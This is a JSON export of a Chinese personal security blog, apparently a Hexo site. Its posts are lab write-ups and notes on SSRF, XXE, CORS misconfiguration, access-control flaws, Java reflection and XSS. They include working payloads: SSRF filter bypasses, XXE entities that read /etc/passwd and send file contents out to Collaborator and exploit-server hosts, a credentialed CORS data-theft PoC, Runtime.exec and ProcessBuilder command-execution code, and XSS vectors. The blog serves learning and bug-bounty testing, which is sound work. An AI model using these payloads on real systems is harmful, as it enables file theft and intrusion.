{"meta":{"title":"清海个人博客","subtitle":"","description":"清海个人博客","author":"Tao","url":"http://github.io","root":"/"},"pages":[{"title":"","date":"2022-10-25T12:22:29.779Z","updated":"2022-10-25T12:22:29.779Z","comments":true,"path":"404.html","permalink":"http://github.io/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"","date":"2022-11-06T13:10:16.074Z","updated":"2022-11-06T13:10:16.074Z","comments":true,"path":"about/index.html","permalink":"http://github.io/about/index.html","excerpt":"","text":""},{"title":"archives","date":"2022-10-25T11:49:10.000Z","updated":"2022-10-25T11:49:10.220Z","comments":true,"path":"archives/index.html","permalink":"http://github.io/archives/index.html","excerpt":"","text":""},{"title":"所有分类","date":"2022-10-26T14:58:21.918Z","updated":"2022-10-25T11:57:52.045Z","comments":true,"path":"categories/index.html","permalink":"http://github.io/categories/index.html","excerpt":"","text":""},{"title":"我的朋友们","date":"2022-10-25T12:18:29.717Z","updated":"2022-10-25T12:18:29.717Z","comments":true,"path":"friends/index.html","permalink":"http://github.io/friends/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2022-10-25T11:57:22.992Z","updated":"2022-10-25T11:57:22.992Z","comments":true,"path":"tags/index.html","permalink":"http://github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Src挖掘-SSRF","slug":"Src挖掘-SSRF","date":"2022-11-19T15:31:27.000Z","updated":"2022-11-19T15:32:38.330Z","comments":true,"path":"2022/11/19/Src挖掘-SSRF/","link":"","permalink":"http://github.io/2022/11/19/Src%E6%8C%96%E6%8E%98-SSRF/","excerpt":"","text":"ssrf基础 利用一个可以发起网络请求的服务器当作跳板来攻击其内部服务器 SSRF (Server-Side Request Forgery) 即服务端请求伪造，从字面意思上理解就是伪造一个服务端请求，也即是说攻击者伪造服务端的请求发起攻击，攻击者借由服务端为跳板来攻击目标系统。 通过跳板直接请求对方的内网,探测对方的内网 利用SSRF可以进行内外网的端口和服务探测、主机本地敏感数据的读取、内外网主机应用程序漏洞的利用等等 SSRF会出现在任何向外或者内部请求数据的地方,有请求并且存在可控参数就有很大可能存在这个漏洞 ssrf的难点在于怎么绕过限制, 这个 常用的bypass手法变形127.0.0.1http://127.0.0.1 有很多代替 1234567891011// 特殊变形http://127。0。0。1/http://127.1/http://0.0.0.0/http://localhost///进制变形http://127.0.0.1 &gt;&gt;&gt; http://0177.0.0.1/http://127.0.0.1 &gt;&gt;&gt; http://2130706433/http://192.168.0.1 &gt;&gt;&gt; http://3232235521/http://192.168.1.1 &gt;&gt;&gt; http://3232235777/ 302跳转绕过302bypass 302跳转 访问外网页面,外网页面我们写好了302跳转,一访问就会跳转,如果对方直接跟随跳转的话就饶过了检测 @字符&#x74;&#101;&#x73;&#x74;&#x2e;&#99;&#x6f;&#109;&#64;&#49;&#x32;&#55;&#46;&#x30;&#46;&#x30;&#x2e;&#x31; 在大部分的解析中会解析为127.0.0.1 但是也会存在解析器解析 test.com 这完全取决于对方的解析器,大部分情况下都是前者但是后者也是在测试中不可忽略的 dns rebinding利用DNS rebinding技术 绕过对方的检测 检测的时候为正常域名,实际上服务器再次请求的时候会变成我们想要的payload地址,达到绕过检测的目的 ssrf靶场(burp)第一关没有过滤,在检查商品处找到一个url,尝试更改url参数发现能跳转,构造内网地址没有过滤,可以直接访问并且会回显到页面上,发现页面存在一个删除用户功能,点击提示没有管理员权限但是发现直接通过get传参,我们直接将ssrf处修改为删除用户的url,成功删除用户 第二关没有做过滤,通过爆破得到内网地址 192.168.0.53存活,然后探测目录 和上一关一样构造url删除用户 第三关对127.0.0.1作了黑名单过滤,尝试各种绕过payload,只有127.1这个有效,并且对方会检测admin这个字母,探测发现对方只对a做了限制,使用url编码绕过”%25%61”,剩下的和上面的关卡一样 第四关重定向绕过 还是检查产品这个功能点,但是尝试后发现存在但过滤完善无法绕过,继续寻找其他功能点,发现下一个产品这个功能点存在重定向(重定向的url可控),结合检查产品处存在的ssrf,实现绕过。 借助重定向进行ssrf攻击 第五关referer头存在完全没有回显的ssrf,更改referer参数为dnslog服务器能够成功看到访问记录,证明存在ssrf漏洞","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"src挖掘","slug":"src挖掘","permalink":"http://github.io/tags/src%E6%8C%96%E6%8E%98/"}],"author":"清海"},{"title":"Src挖掘-XXE","slug":"Src挖掘-XXE","date":"2022-11-19T15:30:31.000Z","updated":"2022-11-19T15:31:16.626Z","comments":true,"path":"2022/11/19/Src挖掘-XXE/","link":"","permalink":"http://github.io/2022/11/19/Src%E6%8C%96%E6%8E%98-XXE/","excerpt":"","text":"XXE漏洞xml和DTDXML 指可扩展标记语言（eXtensible Markup Language）。 XML 被设计用来传输和存储数据，不用于表现和展示数据，HTML 则用来表现数据 文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。 DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用 DTD可以直接在xml文档写入,也可以单独形成文档,因此,DTD分为外部DTD和内部DTD(xml文档中直接写入) xml是具体内容,而DTD是定义文档的结构 xml文档示例: 123456789101112131415161718&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; //第一行是xml声明&lt;!DOCTYPE 员工[ &lt;!ELEMENT 员工 (李亮,张合) &gt; //DTD定义文档 //的结构 &lt;!ELEMENT 李亮 (性别,出生日期) &gt; &lt;!ELEMENT 张合 (性别,出生日期) &gt; &lt;!ELEMENT 性别 (#PCDATA) &gt; &lt;!ELEMENT 出生日期 (#PCDATA) &gt;]&gt;&lt;员工&gt; &lt;李亮&gt; &lt;性别&gt;男&lt;/性别&gt; &lt;出生日期&gt;1993.1.1&lt;/出生日期&gt; xml具体内容 &lt;/李亮&gt; &lt;张合&gt; &lt;性别&gt;男&lt;/性别&gt; &lt;出生日期&gt;1992.1.1&lt;/出生日期&gt; &lt;/张合&gt;&lt;/员工&gt; 内部DTD就是前面介绍的,我们主要说外部DTD 使用外部DTD时要在DOCTYPE中使用SYSTEM和PUBLIC指定外部DTD的位置 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE 水果与季节 SYSTEM &quot;xmldtd.dtd&quot;&gt;&lt;水果与季节&gt; &lt;季节 id=&quot;f1&quot; 名称=&quot;春天&quot;&gt;&lt;/季节&gt; &lt;季节 id=&quot;f2&quot; 名称=&quot;夏天&quot;&gt;&lt;/季节&gt; &lt;水果 f_id=&quot;f1&quot; 名称=&quot;草莓&quot;&gt;&lt;/水果&gt; &lt;水果 f_id=&quot;f2&quot; 名称=&quot;西瓜&quot;&gt;&lt;/水果&gt;&lt;/水果与季节&gt; 实体实体可以理解成变量,在DTD中定义 xml文档中引用 按照类型可以分为四种: 内置实体 字符实体 通用实体 参数实体 按照引用方式可以分为 内部实体 外部实体 参数实体使用” % +实体名称”声明和引用 其余实体直接使用实体名称申明,引用使用&amp; +; 引用 实体的定义 1&lt;!ENTITY XXE &quot;TEST&quot;&gt; 而我们在xml文档中通过&amp;开头和;结尾加上定义的名字就可以直接调用 1&lt;user&gt;&amp;xxe;&lt;/user&gt; 外部实体 在DTD中使用 1&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt; 其中URL可以为很多种类型的实体主要的有 file,http,https,ftp等不同的程序支持的也不一样 漏洞基础 服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入 现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。 XXE漏洞根据有无回显可以分为回显XXE和Blind XXE XXE的危害 123查看文件执行ssrf外带本地敏感文件 现在大部分都是上传和读取docx和xlsx文件导致的XXE 很多的xxe都是使用的java,由于读取&#x2F;etc&#x2F;passwd 有换行可能会导致崩溃或者只能读取一行所以我们可以读取&#x2F;etc&#x2F;hostname 这个只有一行使用这个方便保险 payload合法的xml文档,可以测试对方是否可以解析 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE note [ &lt;!ENTITY hack &quot;test&quot;&gt;]&gt;&lt;name&gt;&amp;hack;&lt;/name&gt; 读取敏感文件12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE note [ &lt;!ENTITY hack SYSTEM &quot;file:///etc/hostname&quot;&gt;]&gt;&lt;name&gt;&amp;hack;&lt;/name&gt; ssrf12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE note [ &lt;!ENTITY hack SYSTEM &quot;http://169.254.169.254&quot;&gt;]&gt;&lt;name&gt;&amp;hack;&lt;/name&gt; 利用外部dtd外带数据123456789// 外部dtd&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;&#x27;&gt;&quot;&gt;%eval;%exfil;// 注入点引用外部dtd&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;https://exploit-0ab2004a03fb7602c0320b0b01290054.exploit-server.net/exploit&quot;&gt; %xxe;]&gt; 利用外部DTD错误回显外带数据123456789// 外部DTD&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;file:///invalid/%file;&#x27;&gt;&quot;&gt;%eval;%exfil;// 注入点引用dtd&lt;!DOCTYPE replace [&lt;!ENTITY % hack SYSTEM &quot;https://exploit-0af9000d03b86eb9c1d30229014200db.exploit-server.net/exploit&quot;&gt; %hack; ]&gt; X include攻击要执行XInclude攻击，需要引用XInclude名称空间并提供希望包含的文件的路径 1&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt; burp靶场测试第一关和第二关在页面上寻找到与服务器有xml交互的,尝试payload看是否解析xml,发现成功解析 第一关要求我们探测&#x2F;etc&#x2F;passwd文件 采用读取文件的payload 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note [ &lt;!ENTITY hack SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;stockCheck&gt;&lt;productId&gt;&amp;hack;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt; 第二关要求我们探测内网 ssrf -payload 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE note [ &lt;!ENTITY hack SYSTEM &quot;http://169.254.169.254&quot;&gt;]&gt;&lt;name&gt;&amp;hack;&lt;/name&gt; 通过每次的回显补全url成功获取敏感信息 第三关还是尝试正常读取文件,没有回显,尝试打dnslog平台,存在访问记录,所以判断存在但是没有回显 第四关正常payload无法正常读取文件访问dnslog 123&lt;!DOCTYPE note [ &lt;!ENTITY hack SYSTEM &quot;file:///etc/hostname&quot;&gt;]&gt; 利用参数实体可以绕过 直接在里面引用了 123&lt;!DOCTYPE stockCheck [ &lt;!ENTITY % xxe SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN&quot;&gt; %xxe; ]&gt; 第五关和上一个关卡一样,只不过这一关需要我们使用恶意外部DTD泄露数据,可以利用burp自带的实验室来测试,在实验室中编写好DTD 通过让对方访问我们的url实现带出数据 外部DTD: 1234&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;&#x27;&gt;&quot;&gt;%eval;%exfil; 在xml解析点插入引用 1&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;https://exploit-0ab2004a03fb7602c0320b0b01290054.exploit-server.net/exploit&quot;&gt; %xxe;]&gt; 第六关对方会返回有关xml的错误消息,我们可以使用错误消息外带数据 将上一关的payload进行更改把外部url更改成一个明知道不存在的文件资源 这样的报错信息会把%file解析带出来 1234567&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;file:///invalid/%file;&#x27;&gt;&quot;&gt;%eval;%exfil;注入点:&lt;!DOCTYPE replace [&lt;!ENTITY % hack SYSTEM &quot;https://exploit-0af9000d03b86eb9c1d30229014200db.exploit-server.net/exploit&quot;&gt; %hack; ]&gt; 第七关x include攻击 1&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"src挖掘","slug":"src挖掘","permalink":"http://github.io/tags/src%E6%8C%96%E6%8E%98/"}],"author":"清海"},{"title":"Src挖掘-cors","slug":"Src挖掘-cors","date":"2022-11-19T15:28:56.000Z","updated":"2022-11-19T15:29:28.026Z","comments":true,"path":"2022/11/19/Src挖掘-cors/","link":"","permalink":"http://github.io/2022/11/19/Src%E6%8C%96%E6%8E%98-cors/","excerpt":"","text":"corscors基础(使用CORS解决跨域问题 - 简书 (jianshu.com)) 跨域是指跨域名的访问 同域名不同端口的也属于跨域访问 跨域问题是对ajax请求的一个限制,能够有效的阻止跨站攻击 但是阻止跨域会带来一些不便,所以我们采用其他技术去支持某些特定情况下的跨域请求资源 目前cors是最流行的一种 cors 是一个规定的W3C标准,全称是”跨域资源共享” 它允许浏览器向跨域的服务器发起XMLHttpRequest请求,克服了AJAX只能够进行同源请求的限制 整个CORS通信过程,都是浏览器自动完成的不需要用户参与,所以对于开发者 cors通信和普通的ajax通信没有多少差别 只需要做相同的处理即可 一般来说浏览器会将ajax请求分为两类, 简单请求和特殊请求 (1) 简单请求 请求方法: head get post http头信息不超过以下几个字段: accept,accept-language,content-language,last-event-id,content-type(只限于三个值 application&#x2F;x-www-form-urlencoded,multipart&#x2F;form-data,text&#x2F;plain&#x2F;) 当浏览器发现客户端发起的ajax请求是简单请求的时候会在请求头中加上 origin 在origin中会指出当前请求的来源(属于哪个域),服务器端通过这个来判断是否允许跨域请求资源 如果服务器端允许跨域,则会在其返回包响应头携带以下字段 access-control-origin: &#x2F;&#x2F;该字段标明可接收的域 access-control-allow-credentials: &#x2F;&#x2F;如果为true表明服务端允许该请求携带cookie content-type: &#x2F;&#x2F;普通字段没有额外含义 (2) 特殊请求 这里不做过多介绍有兴趣自行了解 cors配置错误实际上CORS(跨域资源共享)是浏览器的一种机制 而有的网站如果对cors的策略配置和实施不当会导致一些安全问题(一般是用户的敏感数据泄露)。 在后端会配置CORS白名单,每次请求都会进行判断origin字段来校验是否允许该域名的资源访问 所以说错误的配置是导致CORS漏洞的根本原因 下面是错误配置的例子: 后端将CORS的Access-Control-Allow-Origin设置为了*,即默认允许了所有域名的请求 后端进行了动态设置,不管的origin是什么他都会将其加入到Access-Control-Allow-Origin名单 null 源型的xss 开发者可能没有配置白名单或者有意这样设置的 正则匹配不当导致只要开头和结尾符合就成功 例如 advisor.com，完全信任以advisor.com结尾的所有域名,“definitelynotadvisor.com 和test.com信任了 test.test.com 信任所有子域名并且不存在配置错误问题 我们可以找到子域名下存在xss的站点来进行攻击 cors漏洞靶场测试第一关很简单的cors配置错误,对方会动态的将你的origin 头添加到cors信任域里面导致的cors漏洞 我们只需要使用标准的poc,搭建好服务在对方登录的情况下让对方点击即可获取敏感信息 POC如下: 123456789101112&lt;script&gt; var url=&quot;&quot; var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#x27;get&#x27;,url,true); req.withCredentials = true; req.send(); function reqListener() &#123; alert(this.responseText); console.log(this.responseText);&#125;;&lt;/script&gt; 第二关这一关 你会发现虽然返回了Access-Control-Allow-Credentials: true 但是并没有返回 Access-Control-Allow-Origin: 查阅资料后发现这是对方将Access-Control-Allow-Origin:设置为null的配置问题 ,我们将origin设置为空会收到 Access-Control-Allow-Origin: null 这种我们在编写poc的时候要注意必须要使用iframe来包裹,只有这样受害者传到服务器的origin才为空 poc如下 1234567891011121314&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; srcdoc=&quot;&lt;script&gt; var url=&#x27;https://0af5004b0316e738c048efee006e00c1.web-security-academy.net/accountDetails&#x27;; var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#x27;get&#x27;,url,true); req.withCredentials = true; req.send(); function reqListener() &#123; alert(this.responseText) console.log(this.responseText) &#125;; &lt;/script&gt;&quot;&gt; 第三关子站下面存在xss,通过xss执行poc实现攻击","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"src挖掘","slug":"src挖掘","permalink":"http://github.io/tags/src%E6%8C%96%E6%8E%98/"}],"author":"清海"},{"title":"Src挖掘-越权","slug":"Src挖掘-越权","date":"2022-11-19T15:26:22.000Z","updated":"2022-11-19T15:27:22.010Z","comments":true,"path":"2022/11/19/Src挖掘-越权/","link":"","permalink":"http://github.io/2022/11/19/Src%E6%8C%96%E6%8E%98-%E8%B6%8A%E6%9D%83/","excerpt":"","text":"越权漏洞基础越权漏洞:攻击者可以通过某些方法获得不属于它的权限,根据本身权限和获得的权限可以划分为平行越权和垂直越权 这里的某些方法可能是更改参数,思路开阔一切都有可能,要找到对方在进行权限判断的时候的关键参数和逻辑 这种漏洞常常出现在对方需要根据我们的权限来提供内容的时候,增删改查这种需要根据权限提供对应操作的地方 类似越权评论,越权删除等 这个漏洞没啥理论知识。直接收集实战案例,多思考即可 越权实战收集几个注意点: 要注意分析对方鉴别权限的方法:例如是通过cookie?id?等确定鉴权方式再去攻击会事半功倍 返回包和请求包中不存在token和sign最容易出现越权操作 越权删除评论对方返回包和请求包没有鉴定权限的数据 确定对方直接根据rpid来进行删除的操作的,抓其他地方的包找到别的评论的rpid,更改删除成功 越权导致任意登录一个获取信息的接口,cookie无效返回包中有token但是无效,authflowId参数可以替换,并且每次登录都一样(该参数应该是和用户进行了绑定不会改变),可以爆破这个authflowid来实现越权查看别人的信息,并且对方在返回包中会包含ppu 参数经过测试发现其值为cookie,所以我们通过authflowid遍历获取ppu实现任意账号登录 越权修改收货地址任意更改地址 存在原因: 对方根据订单号来进行修改地址,我们遍历订单号来实现任意收货地址 的修改 越权撤回消息对方根据comment_id来进行删除,并且对方的comment_id能够通过评论对方时抓包获取 越权修改密码对方在修改密码的地方做了完善的鉴权,但是在通过新用户注册新账号的密码的包没有做限制直接修改memberId即可更改老用户的密码 任意用户注册对方直接在返回包中直接返回了激活账号的信息,可以实现任意用户的注册 验证码爆破导致的任意用户注册验证码时间过长位数过少,导致可以爆破 越权导出简历在信息导出功能中，企业通过发送邮件到自己的邮箱来导出个人信息 根据resumeId 来进行发送,遍历这个id实现把对方的简历发送给你 越权仅自己可见发送动态处存在删除动态和仅自己可见,删除功能点不存在越权,但是在仅自己可见处存在越权,遍历entryid实现对别人的 动态仅自己可见 越权购买不可购买的东西直接替换商品id 导出pdf任意下载在导出pdf的地方直接遍历下载 越权网络管理对方通过net_id 来给你返回你的网络情况,遍历net_id实现越权网络管理 越权访问未授权资源付费资源免费用 例如:某视频需要会员才能观看,但是对方在其他地方泄露了视频的url资源,我们直接访问就可以免费观看","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"src挖掘","slug":"src挖掘","permalink":"http://github.io/tags/src%E6%8C%96%E6%8E%98/"}],"author":"清海"},{"title":"java安全day1:反射","slug":"java安全day1-反射","date":"2022-11-19T15:23:18.000Z","updated":"2022-11-19T15:25:40.236Z","comments":true,"path":"2022/11/19/java安全day1-反射/","link":"","permalink":"http://github.io/2022/11/19/java%E5%AE%89%E5%85%A8day1-%E5%8F%8D%E5%B0%84/","excerpt":"","text":"反射java反射就是再运行状态中,对于任意一个类,都能知道这个类的所有方法和属性;对于任意一个对象都能调用它的方法,并且改变它的属性 反射这个机制让静态语言有了动态性(java语言会被看做准动态语言) java反射的关键就在于获取指定类的Class对象 一个类在 JVM 中只会有一个 Class 实例 获得Class对象的三种方式: Class.forName(“类的名字”) 对象.getClass() 类名.class 几个在反射中重要的方法 获取类对象 forName 实例化类对象 newInstance 获取指定函数 getMethod 执行函数 invoke 借助这几个方法,我们可以做到动态加载执行目标类的某些方法,基本包含了java安全里面各种和反射相关的payload forNameforName有两个函数重载 12Class&lt;?&gt; forName(String name)Class&lt;?&gt; forName(String name, boolean initialize, ClassLoader loader) 默认情况下,forName的第一个参数是类名,第二个参数表示是否初始化,第三个参数就是classLoader 如果没有给定 classloader,那么会使用根类加载器。如果 initalize 这个参数传了 true,那么给定的类如果之前没有被初始化过,那么会被初始化 类中代码块初始化顺序12345678910111213public class Test01 &#123; &#123; System.out.println(&quot;A&quot;); &#125; static &#123; System.out.println(&quot;B&quot;); &#125; public Test01() &#123; System.out.println(&quot;C&quot;); &#125; public static void main(String[] args) &#123; &#125;&#125; 在运行过上面的代码后,我们能知道static中的内容是最先执行的,然后是{}里面的,最后是类中定义的方法 static在类的初始化的时候调用,{}中的代码会放在构造函数的super后面当前函数的构造函数前面 如何利用加载顺序执行恶意代码对方存在如下函数,并且函数的name参数是可控的 123public void ref(String name) throws ClassNotFoundException &#123; Class.forName(name); &#125; 我们可以编写恶意类,利用name参数让后让对方去加载我们这个类,因为加载机制我们只需要将恶意代码放在static代码块中就能保证恶意代码被对方执行 12345678910static &#123; try &#123; Runtime rt = Runtime.getRuntime(); String[] commands = &#123;&quot;touch&quot;, &quot;/tmp/success&quot;&#125;; Process pc = rt.exec(commands); pc.waitFor(); &#125; catch (Exception e) &#123; // do nothing&#125;&#125; 第一天,简单的了解了java的反射机制和forName 第二天我们继续了解一下反射 正常情况下,我们要得到一个类(除了系统类)我们必须先import才能使用,而使用forName就不需要,这对于我们攻击者来说是十分有利的,通过forName我们可以加载任意类 获得类之后,我们可以利用其他反射方法来获取这个类的属性,方法,也可以实例化这个类,并且调用这个类的方法 getMethod和invoke方法getMethod的作用是通过反射获取一个类的某个特定的公有方法, 第一个参数是要获取的方法的名字,第二个参数是方法的参数列表(这是由于java支持类的重载) invoke的作用是执行方法: 如果这个方法是一个普通方法,那么第一个参数是类对象 如果这个方法是一个静态方法,那么第一个参数是类 内部类Java的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： C1.class 和C1$C2.class ，我们可以把他们看作两个无关的类，通过 Class.forName(“C1$C2”) 即可加载这个内部类。 无参构造class.newInstance的作用就是调用这个类的无参构造函数,这个比较好理解,但是在有些情况下我们使用newInstance会报错,原因可能是 你使用的类没有无参构造函数 你使用的类构造函数是私有的 java.lang.Runtime,这个类就是典型例子 12Class clazz = Class.forName(&quot;java.lang.Runtime&quot;); clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.newInstance(),&quot;id&quot;); 通过这样反射执行exec方法编译器会报错,原因就是runtime类的构造方法是私有的 单例模式为什么会存在类的构造方法是私有的? 这关系到java中的一个设计模式,单例模式(有的时候工厂模式也会出现这种情况) 介绍: 单例模式（Singleton Pattern）是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。 这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。 解决问题上面由于runtime这个类符合单例模式设计,所以它的无参构造是私有的,我们无法直接获取,所以我们需要通过它提供的getRuntime来间接执行exec函数 代码如下: 12Class clazz = Class.forName(&quot;java.lang.Runtime&quot;); clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),&quot;calc.exe&quot;); 上面的代码利用了单例模式的静态方法,那么如果一个类没有无参构造方法,也没有单例模式中的静态方法,我们又该怎么去执行它呢? getConstructor方法这个方法可以获取有参构造函数,因为java中的类一定有构造函数的,如果没有无参那么必定有有参构造,针对没有无参构造函数的我们可以使用这个方法来获取,然后利用newInstance执行有参数的构造函数 比如:我们经常使用的另外一种执行命令的方式ProcessBulider,我们使用反射来获取其构造函数,然后调用start来执行命令 123Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;); ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;))).start(); 这样执行利用了强制类型转换,但是在利用漏洞的时候是不允许使用这种语法的所以我们需要进一步去优化这段代码 我们可以直接获得start方法,让利用invoke执行start,这样就不需要去进行一次类型转换 1Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;); clazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;))); 如果我们需要使用ProcessBuilder的另外一个有参构造,我们只需要更改参数就行 12Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;); clazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(String[].class).newInstance(newString[][]&#123;&#123;&quot;calc.exe&quot;&#125;&#125;)); 这里涉及到一个知识点,我们直接使用了可变长参数 可变长参数正如其他语言一样，Java也支持可变长参数，就是当你定义函数的时候不确定参数数量的时候，可以使用 … 这样的语法来表示“这个函数的参数个数是可变的”。对于可变长参数，Java其实在编译的时候会编译成一个数组，也就是说，如下这两种写法在底层是等价的 12public void hello(String[] names) &#123;&#125;public void hello(String...names) &#123;&#125; 如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了 执行私有方法利用getDeclared系列的反射 和getMethod,getConstructor系列方法的区别是: getMethod方法获取的是类中的素有公共方法 getDeclaredMethod系列方法获取的是当前类中”声名”的方法,是写在这个类中的方法,从父类中继承来的不包含在其中 getDeclaredMethod具体用法和 getMethod 类似 getDeclaredConstructor 的具体用法和getConstructor 类似 前面我们因为Runtime这个类的构造函数是私有的,我们需要使用Runtime.getRuntime来获取对象,其实我们也可以直接使用getDeclaredConstructor来获取这个私有的构造方法来实例化对象进而执行命令 代码如下所示 setAccessible ，这个是必须的。我们在获取到一个私有方法后，必须用setAccessible 修改它的作用域，否则仍然不能调用 1234Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);Constructor m = clazz.getDeclaredConstructor();m.setAccessible(true);clazz.getMethod(&quot;exec&quot;, String.class).invoke(m.newInstance(), &quot;calc.exe&quot;); 反射总结反射帮助我们在漏洞利用中调用危险方法(本身程序没写)但是我们利用反射可以得到危险方法所在类,进而去调用危险方法 例如:runtime的exec执行系统命令和利用ProcessBuilder类执行系统命令 而上面的内容基本包括了你在漏洞利用时候调用危险函数的基本情况,我们在不同情况下应该利用反射的不同函数来实现我们的目的","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://github.io/tags/java%E5%AE%89%E5%85%A8/"}],"author":"清海"},{"title":"XSS漏洞详解","slug":"XSS漏洞详解","date":"2022-10-29T13:00:37.000Z","updated":"2022-11-05T15:30:42.827Z","comments":true,"path":"2022/10/29/XSS漏洞详解/","link":"","permalink":"http://github.io/2022/10/29/XSS%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"xss基础​ 跨站脚本攻击(Cross Site Scripting) 因缩写容易和css混淆,所以称为XSS攻击 ​ XSS是前端注入型漏洞 攻击者利用开发人员的疏忽在web页面注入恶意代码(一般为javascript代码)进行攻击。 ​ XSS是针对前端对用户层面的攻击 ​ XSS一般分为三类:存储型,反射型,DOM型 反射型​ 非持久化的攻击,需要受害者去点击构造的恶意url ​ 发起请求并且参数会出现在url上,服务端接收处理后将其内容返回给浏览器端 存储型​ 持久化的攻击,恶意代码被存储在目标站点的服务器中,每次访问对应页面都会触发 svg 和html文件上传 DOM型​ 完全不经过后端,和反射性很相似(可以看作是特殊的反射型xss),通过传入参数,参数被开发使用js将该参数渲染到前端页面上。 payload的构造xss payload 一般是事件或者标签 常用弹窗方式alert ,confirm,prompt, console 1234&lt;script&gt;alert(&quot;1&quot;)&lt;/script&gt; &lt;script&gt;confirm(2)&lt;/script&gt;&lt;script&gt;prompt(3)&lt;/script&gt;&lt;script&gt;console.log(alert(4))&lt;/script&gt; 常用标签和对应事件常见的标签有 a标签,input标签,iframe标签 img标签 无论是什么标签我们要做的就是一件事 闭合前面(引号闭合属性,尖括号闭合标签),构造新的语句(事件或者新的标签) a标签经常使用伪协议来绕过 同样可以使用伪协议的标签有 iframe标签 form表单的action属性(需要配合提交按钮才能触发) a标签中常用的事件 onclick 代码示例 1234伪协议:&lt;a href=&quot;javascript:alert(1)&quot; onclick=&quot;alert(1)&quot;&gt;123&lt;/a&gt;点击事件:&lt;a href=&quot;http://baidu.com&quot; onclick=&quot;alert(1)&quot;&gt;123&lt;/a&gt; input标签input标签是无法使用伪协议的 只能构造事件或者将标签闭合插入新的标签 另外有些情况下 input标签被隐藏,我们可以使用 type&#x3D;text 覆盖 hidden属性 还能直接利用onfocus事件 配合autofocus 自动聚焦 直接不需要点击触发 img标签这个标签 是经常在闭合前面的标签后使用的 1&lt;img src onerror=alert(1)&gt; 